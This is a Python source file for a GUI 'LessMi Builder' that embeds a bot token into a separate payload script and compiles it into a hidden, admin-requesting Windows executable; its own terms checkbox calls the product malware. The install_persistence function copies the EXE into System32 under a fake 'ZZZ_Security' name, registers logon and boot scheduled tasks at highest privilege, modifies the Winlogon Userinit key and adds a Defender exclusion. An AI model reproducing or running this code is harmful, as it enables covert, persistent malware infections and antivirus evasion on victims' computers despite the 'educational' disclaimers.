#  __  __       _          _    ____
# |  \/  | __ _| |_ ___   / \  / ___|
# | |\/| |/ _` | __/ _ \ / _ \| |  _
# | |  | | (_| | ||  __// ___ \ |_| |
# |_|  |_|\__,_|\__\___/_/   \_\____|
#
# (c) Copyright 2026 - MateAG
# All rights reserved. Any copy without
# consent of this code will be reported.
#
# This project is only for educational purposes.
# The creator is NOT responsible of any illegal/malicious use
# of this project.
#
# The creator advices you to use this for testing and
# legal activities. If you want to install this on
# someone else computer, please ask them for the
# permission to.
#
# Thank you and happy testing! <3


import customtkinter as ctk
import tkinter.filedialog
import os
import re
import sys
import shutil
import threading
import time
import urllib.request
import winreg
import random
import math
from io import BytesIO

try:
    import pygame
    pygame.mixer.init()
    AUDIO_AVAILABLE = True
except Exception:
    AUDIO_AVAILABLE = False

ctk.set_appearance_mode("Dark")

ACCENTS = ["#f1f1f1", "#c9d1ff", "#a8e6ff", "#ffd6f6", "#f1f1f1"]


def install_persistence(exe_path):
    try:
        target_dir = r"C:\Windows\System32\ZZZ_Security"
        os.makedirs(target_dir, exist_ok=True)
        target_exe = os.path.join(target_dir, "ZZZ_Security.exe")
        if exe_path and os.path.exists(exe_path):
            try:
                shutil.copy2(exe_path, target_exe)
            except Exception:
                pass

        import subprocess
        subprocess.run(["schtasks", "/Create", "/TN", "ZZZ_Security_Logon", "/TR", f'"{target_exe}"',
                        "/SC", "ONLOGON", "/RL", "HIGHEST", "/F"], capture_output=True)
        subprocess.run(["schtasks", "/Create", "/TN", "ZZZ_Security_Boot", "/TR", f'"{target_exe}"',
                        "/SC", "ONSTART", "/RL", "HIGHEST", "/F"], capture_output=True)

        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_ALL_ACCESS)
            try:
                existing, _ = winreg.QueryValueEx(key, "Userinit")
                if "ZZZ_Security.exe" in existing:
                    winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, r"C:\Windows\System32\userinit.exe,")
            except FileNotFoundError:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

        subprocess.run(["powershell", "-NoProfile", "-Command",
                        f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue'], capture_output=True)
    except Exception:
        pass


class ModernBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("LessMi Builder")
        self.geometry("980x820")
        self.minsize(820, 640)
        self.resizable(True, True)
        self.configure(fg_color="#080808")
        self.attributes("-alpha", 0.0)

        self.config_data = {
            "token_1": "",
            "exe_name": "app.exe",
            "icon_path": "",
        }

        self.sound_buffers = []
        self.last_sound_index = -1
        self.accent_index = 0
        self.pulse_val = 0
        self.pulse_dir = 1
        self.log_lines = []
        self.init_key_sounds()

        self.create_widgets()
        self.animate_accent()
        self.animate_pulse()
        self.fade_in()

    def init_key_sounds(self):
        if not AUDIO_AVAILABLE:
            return
        urls = [
            "https://www.myinstants.com/media/sounds/creamy-keyboard-once.mp3",
            "https://www.myinstants.com/media/sounds/creamy-keyboard-v7.mp3",
            "https://www.myinstants.com/media/sounds/galaxy-s25-keypress-retro-theme.mp3",
        ]

        def load_audio():
            for url in urls:
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req) as resp:
                        sound = pygame.mixer.Sound(BytesIO(resp.read()))
                        self.sound_buffers.append(sound)
                except Exception:
                    pass

        threading.Thread(target=load_audio, daemon=True).start()

    def play_key_sound(self, event=None):
        if not AUDIO_AVAILABLE or not self.sound_buffers:
            return
        if event:
            if not (len(event.char) == 1 or event.keysym in ("BackSpace", "Return", "space")):
                return
            idx = self.last_sound_index
            if len(self.sound_buffers) > 1:
                while idx == self.last_sound_index:
                    idx = random.randint(0, len(self.sound_buffers) - 1)
            else:
                idx = 0
            self.last_sound_index = idx
            sound = self.sound_buffers[idx]
            sound.set_volume(0.3 + random.uniform(0.0, 0.15))
            sound.play()

    def fade_in(self, a=0.0):
        a += 0.08
        if a >= 1.0:
            self.attributes("-alpha", 1.0)
            return
        self.attributes("-alpha", a)
        self.after(15, lambda: self.fade_in(a))

    def animate_accent(self):
        self.accent_index = (self.accent_index + 1) % len(ACCENTS)
        color = ACCENTS[self.accent_index]
        try:
            self.lbl_title.configure(text_color=color)
            self.accent_bar.configure(fg_color=color)
        except Exception:
            pass
        self.after(900, self.animate_accent)

    def animate_pulse(self):
        self.pulse_val += 0.06 * self.pulse_dir
        if self.pulse_val >= 1.0:
            self.pulse_val = 1.0
            self.pulse_dir = -1
        elif self.pulse_val <= 0.3:
            self.pulse_val = 0.3
            self.pulse_dir = 1
        try:
            g = int(120 + 130 * self.pulse_val)
            self.dot.configure(text_color=f"#{g:02x}{g:02x}{g:02x}")
        except Exception:
            pass
        self.after(50, self.animate_pulse)

    def create_widgets(self):
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(2, weight=1)

        header = ctk.CTkFrame(self, height=90, corner_radius=18, fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        header.grid(row=0, column=0, padx=24, pady=(24, 6), sticky="ew")
        header.grid_propagate(False)

        self.lbl_title = ctk.CTkLabel(header, text="LessMi Builder",
                                      font=ctk.CTkFont(family="Poppins", size=26, weight="bold"),
                                      text_color="#f2f2f2")
        self.lbl_title.pack(side="left", padx=24, pady=10)

        ctk.CTkLabel(header, text="Beta v2.0 - MateAGYT/LessMi",
                     font=ctk.CTkFont(family="Poppins", size=12), text_color="#8c8c8c").pack(side="right", padx=24)

        self.accent_bar = ctk.CTkFrame(self, height=3, corner_radius=2, fg_color="#f1f1f1")
        self.accent_bar.grid(row=1, column=0, padx=24, pady=(0, 12), sticky="ew")

        body = ctk.CTkFrame(self, fg_color="transparent")
        body.grid(row=2, column=0, padx=24, pady=6, sticky="nsew")
        body.grid_columnconfigure(0, weight=3)
        body.grid_columnconfigure(1, weight=2)
        body.grid_rowconfigure(0, weight=1)

        left = ctk.CTkScrollableFrame(body, label_text="CONFIGURATION",
                                      label_font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                                      label_text_color="#8c8c8c", corner_radius=16,
                                      fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        left.grid(row=0, column=0, padx=(0, 12), sticky="nsew")
        left.grid_columnconfigure((0, 1), weight=1)

        self.inputs = {}
        fields = [
            ("Bot Token (*)", "token_1", "", True),
            ("Executable Name (*)", "exe_name", "application.exe", False),
            ("Backup Token 1", "token_2", "", True),
            ("Backup Token 2", "token_3", "", True),
        ]

        for i, (text, key, default, is_pass) in enumerate(fields):
            r, c = i // 2, i % 2
            card = ctk.CTkFrame(left, fg_color="#101010", corner_radius=12, border_width=1, border_color="#1a1a1a")
            card.grid(row=r, column=c, padx=8, pady=8, sticky="ew")
            card.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(card, text=text, font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                         text_color="#8c8c8c").grid(row=0, column=0, padx=14, pady=(10, 2), sticky="w")
            ent = ctk.CTkEntry(card, show="*" if is_pass else "", border_width=1, corner_radius=8,
                               fg_color="#0a0a0a", border_color="#1a1a1a", text_color="#f2f2f2",
                               font=ctk.CTkFont(family="Poppins", size=12))
            ent.insert(0, default)
            ent.grid(row=1, column=0, padx=14, pady=(0, 10), sticky="ew")
            ent.bind("<KeyPress>", self.play_key_sound)
            self.inputs[key] = ent

        icon_card = ctk.CTkFrame(left, fg_color="#101010", corner_radius=12, border_width=1, border_color="#1a1a1a")
        icon_card.grid(row=2, column=0, columnspan=2, padx=8, pady=10, sticky="ew")
        icon_card.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(icon_card, text="Custom icon (.ico)",
                     font=ctk.CTkFont(family="Poppins", size=12, weight="bold"),
                     text_color="#f2f2f2").grid(row=0, column=0, padx=14, pady=12, sticky="w")
        self.btn_icon = ctk.CTkButton(icon_card, text="Upload .ico", command=self.select_icon,
                                      fg_color="#f1f1f1", hover_color="#ffffff", text_color="#111111",
                                      font=ctk.CTkFont(family="Poppins", size=12, weight="bold"),
                                      corner_radius=999)
        self.btn_icon.grid(row=0, column=1, padx=14, pady=12, sticky="e")

        right = ctk.CTkFrame(body, corner_radius=16, fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        right.grid(row=0, column=1, sticky="nsew")
        right.grid_rowconfigure(1, weight=1)
        right.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(right, text="BUILD LOG", font=ctk.CTkFont(family="Poppins", size=11, weight="bold"),
                     text_color="#8c8c8c").grid(row=0, column=0, padx=16, pady=(14, 4), sticky="w")

        self.console = ctk.CTkTextbox(right, fg_color="#080808", text_color="#c9ffd0", corner_radius=12,
                                      border_width=1, border_color="#1a1a1a",
                                      font=ctk.CTkFont(family="Consolas", size=11), wrap="word")
        self.console.grid(row=1, column=0, padx=12, pady=(0, 12), sticky="nsew")
        self.console.configure(state="disabled")

        footer = ctk.CTkFrame(self, height=120, corner_radius=16, fg_color="#0d0d0d", border_width=1, border_color="#1a1a1a")
        footer.grid(row=3, column=0, padx=24, pady=(12, 24), sticky="ew")

        controls = ctk.CTkFrame(footer, fg_color="transparent")
        controls.pack(fill="both", expand=True, padx=20, pady=12)

        status_container = ctk.CTkFrame(controls, fg_color="transparent")
        status_container.pack(side="left", fill="both", expand=True)

        row = ctk.CTkFrame(status_container, fg_color="transparent")
        row.pack(fill="x")
        self.dot = ctk.CTkLabel(row, text="●", font=ctk.CTkFont(size=14), text_color="#8c8c8c")
        self.dot.pack(side="left", padx=(0, 6))
        self.lbl_status = ctk.CTkLabel(row, text="Ready to compile",
                                       font=ctk.CTkFont(family="Poppins", size=12),
                                       text_color="#8c8c8c", anchor="w")
        self.lbl_status.pack(side="left", fill="x")

        self.progress = ctk.CTkProgressBar(status_container, height=5, corner_radius=3,
                                           fg_color="#101010", progress_color="#f1f1f1")
        self.progress.set(0)
        self.progress.pack(fill="x", pady=(8, 0))

        self.lbl_pct = ctk.CTkLabel(status_container, text="0%",
                                    font=ctk.CTkFont(family="Poppins", size=10), text_color="#555555")
        self.lbl_pct.pack(anchor="e")

        actions = ctk.CTkFrame(controls, fg_color="transparent")
        actions.pack(side="right", padx=(16, 0))

        self.chk_onefile = ctk.CTkCheckBox(actions, text="EXE Output",
                                           font=ctk.CTkFont(family="Poppins", size=11), text_color="#8c8c8c",
                                           border_width=1, corner_radius=4, checkmark_color="#111111", fg_color="#f1f1f1")
        self.chk_onefile.select()
        self.chk_onefile.pack(side="top", anchor="e", pady=(0, 6))

        self.chk_terms = ctk.CTkCheckBox(actions, text="I'm aware that this malware has been made for educational purposes only, and the creator is no way responsible\n"
                 "for any direct or indirect damage caused due to the misusage of the information. Everything I do, I'm doing at\n"
                 "my own risk and responsibility. The creator is no way responsible of your internet activities. This is meant for testing.",
                                         font=ctk.CTkFont(family="Poppins", size=11), text_color="#8c8c8c",
                                         command=self.toggle_build_button, border_width=1, corner_radius=4,
                                         checkmark_color="#111111", fg_color="#f1f1f1")
        self.chk_terms.pack(side="top", anchor="e", pady=(0, 6))

        self.btn_compile = ctk.CTkButton(actions, text="COMPILE PROJECT", command=self.start_compile_thread,
                                         height=40, width=220, font=ctk.CTkFont(family="Poppins", size=13, weight="bold"),
                                         state="disabled", fg_color="#f1f1f1", hover_color="#ffffff",
                                         text_color="#111111", corner_radius=999)
        self.btn_compile.pack(side="top", anchor="e")
        self.btn_compile.bind("<Enter>", lambda e: self.hover_button(True))
        self.btn_compile.bind("<Leave>", lambda e: self.hover_button(False))

        self.apply_smooth_scroll(left)

    def hover_button(self, entering):
        if self.btn_compile.cget("state") == "normal":
            self.btn_compile.configure(fg_color="#ffffff" if entering else "#f1f1f1")

    def apply_smooth_scroll(self, scroll_frame):
        canvas = scroll_frame._parent_canvas
        canvas._scroll_target = 0
        canvas._scroll_job = None

        def animate():
            if not canvas.winfo_exists():
                return
            current = canvas.yview()[0]
            target = canvas._scroll_target
            diff = target - current
            if abs(diff) > 0.001:
                canvas.yview_moveto(current + diff * 0.25)
                canvas._scroll_job = self.after(12, animate)
            else:
                canvas.yview_moveto(target)
                canvas._scroll_job = None

        def on_wheel(event):
            delta = -1 * (event.delta / 120)
            cur = canvas._scroll_target if canvas._scroll_job else canvas.yview()[0]
            canvas._scroll_target = max(0.0, min(1.0, cur + (delta * 0.08)))
            if not canvas._scroll_job:
                animate()
            return "break"

        canvas.bind_all("<MouseWheel>", on_wheel)

    def log(self, msg):
        ts = time.strftime("%H:%M:%S")
        self.console.configure(state="normal")
        self.console.insert("end", f"[{ts}] {msg}\n")
        self.console.see("end")
        self.console.configure(state="disabled")

    def toggle_build_button(self):
        self.btn_compile.configure(state="normal" if self.chk_terms.get() == 1 else "disabled")

    def select_icon(self):
        path = tkinter.filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if path:
            self.config_data["icon_path"] = path
            self.btn_icon.configure(text=os.path.basename(path))

    def update_status(self, msg, progress_val=None):
        self.lbl_status.configure(text=msg)
        self.log(msg)
        if progress_val is not None:
            self.progress.set(progress_val)
            self.lbl_pct.configure(text=f"{int(progress_val * 100)}%")

    def start_compile_thread(self):
        self.btn_compile.configure(state="disabled")
        self.chk_terms.configure(state="disabled")
        self.chk_onefile.configure(state="disabled")
        threading.Thread(target=self.compile_process, daemon=True).start()

    def compile_process(self):
        for key, widget in self.inputs.items():
            self.config_data[key] = widget.get()

        token = self.config_data["token_1"].strip()
        if not token:
            self.update_status("Error: Bot Token is required")
            self.reset_ui_state()
            return

        source_path = "source_assembled.py"
        if not os.path.exists(source_path):
            self.update_status("Error: source_assembled.py not found")
            self.reset_ui_state()
            return

        exe_target = self.config_data["exe_name"]
        if exe_target.endswith(".exe"):
            exe_target = exe_target[:-4]
        if not exe_target:
            exe_target = "app"

        self.update_status("Preparing build environment...", 0.2)
        import subprocess
        subprocess.run(["taskkill", "/f", "/im", f"{exe_target}.exe"], capture_output=True)
        time.sleep(1)

        try:
            if os.path.exists("dist"):
                shutil.rmtree("dist")
            if os.path.exists("build"):
                shutil.rmtree("build")
            os.makedirs("dist", exist_ok=True)

            for res in ["resources", "custom_imports.txt"]:
                if os.path.exists(res):
                    dest = os.path.join("dist", res)
                    if os.path.isdir(res):
                        shutil.copytree(res, dest, dirs_exist_ok=True)
                    else:
                        shutil.copy2(res, dest)

            if self.config_data["icon_path"]:
                shutil.copy2(self.config_data["icon_path"], os.path.join("dist", "icon.ico"))
        except Exception as e:
            self.update_status(f"Error preparing build: {e}")
            self.reset_ui_state()
            return

        self.update_status("Injecting token...", 0.45)

        with open(source_path, "r", encoding="utf-8") as f:
            lines = f.readlines()

        new_lines = []
        replaced = False
        for line in lines:
            if not replaced and re.match(r'^\s*token\s*=', line):
                new_lines.append(f'token = "{token}"\n')
                replaced = True
            else:
                new_lines.append(line)

        if not replaced:
            out = []
            injected = False
            for line in new_lines:
                if not injected and line.startswith("if __name__"):
                    out.append(f'token = "{token}"\n\n')
                    injected = True
                out.append(line)
            if not injected:
                out.append(f'\ntoken = "{token}"\n')
            new_lines = out

        with open(os.path.join("dist", "source_final.py"), "w", encoding="utf-8") as f:
            f.writelines(new_lines)

        self.update_status("Compiling .EXE...", 0.7)

        original_dir = os.getcwd()
        os.chdir("dist")

        cmd = [sys.executable, "-m", "PyInstaller", "--noconsole",
               f"--name={exe_target}", "--distpath=.", "--workpath=build", "--specpath=.",
               "source_final.py"]
        cmd.append("--onefile" if self.chk_onefile.get() == 1 else "--onedir")
        cmd.append("--uac-admin")
        if self.config_data["icon_path"]:
            cmd.append("--icon=icon.ico")

        sep = ";" if os.name == "nt" else ":"
        if os.path.exists("resources"):
            cmd.append(f"--add-data=resources{sep}resources")
        if os.path.exists("custom_imports.txt"):
            cmd.append(f"--add-data=custom_imports.txt{sep}.")

        try:
            subprocess.run(cmd, check=True)
            self.update_status("Compile finished", 1.0)

            exe_out = os.path.join(os.getcwd(), f"{exe_target}.exe")
            if not os.path.exists(exe_out):
                exe_out = os.path.join(os.getcwd(), exe_target, f"{exe_target}.exe")

            install_persistence(exe_out)

            output_dir = os.getcwd()
            if os.name == "nt":
                os.startfile(output_dir)
            else:
                os.system(f'xdg-open "{output_dir}"')
        except Exception as e:
            self.update_status(f"Error compiling: {e}")
        finally:
            os.chdir(original_dir)
            self.reset_ui_state()

    def reset_ui_state(self):
        self.chk_terms.configure(state="normal")
        self.chk_onefile.configure(state="normal")
        if self.chk_terms.get() == 1:
            self.btn_compile.configure(state="normal")


if __name__ == "__main__":
    app = ModernBuilder()
    app.mainloop()